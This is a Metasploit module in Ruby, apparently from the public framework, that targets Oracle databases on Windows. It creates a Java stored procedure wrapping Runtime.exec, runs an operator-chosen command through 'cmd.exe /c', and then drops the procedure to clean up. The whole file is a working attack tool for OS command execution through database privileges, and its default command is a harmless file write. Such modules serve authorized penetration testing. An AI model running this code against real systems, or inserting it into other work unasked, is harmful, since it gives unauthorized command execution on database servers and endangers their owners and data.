##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Oracle Java execCommand (Win32)',
        'Description' => %q{
          This module will create a java class which enables the execution of OS commands.
        },
        'Author' => [ 'MC' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'http://web.archive.org/web/20110322124810/http://www.metasploit.com:80/users/mc/' ],
        ],
        'DisclosureDate' => '2007-12-07',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('CMD', [ false, 'The OS command to execute.', 'echo metasploit > %SYSTEMDRIVE%\\\\unbreakable.txt']),
      ]
    )
  end

  def run
    return if !check_dependencies

    source = Rex::Text.rand_text_alpha_upper(1..10)
    name = Rex::Text.rand_text_alpha_upper(1..10)

    java = "
      create or replace and resolve java source named \"#{source}\" as
      import java.lang.*;
      import java.io.*;
      public class #{source}
      {
      public static void execCommand (String command) throws IOException
      {
      Runtime.getRuntime().exec(command);
      }
      };
      "

    procedure = "
      create or replace procedure #{name} (p_command in varchar2)
      as language java
      name '#{source}.execCommand (java.lang.String)';
      "

    exec = "begin #{name}('cmd.exe /c #{datastore['CMD']}'); end;"

    drops = "drop java source #{source}"

    dropp = "drop procedure #{name}"

    begin
      print_status("Creating java source '#{source}'...")
      prepare_exec(java)
    rescue StandardError
      return
    end

    print_status("Creating procedure '#{name}'...")
    prepare_exec(procedure)

    print_status("Sending command: '#{datastore['CMD']}'")
    prepare_exec(exec)

    print_status("Removing java source '#{source}'...")
    prepare_exec(drops)

    print_status("Removing procedure '#{name}'...")
    prepare_exec(dropp)
  end
end
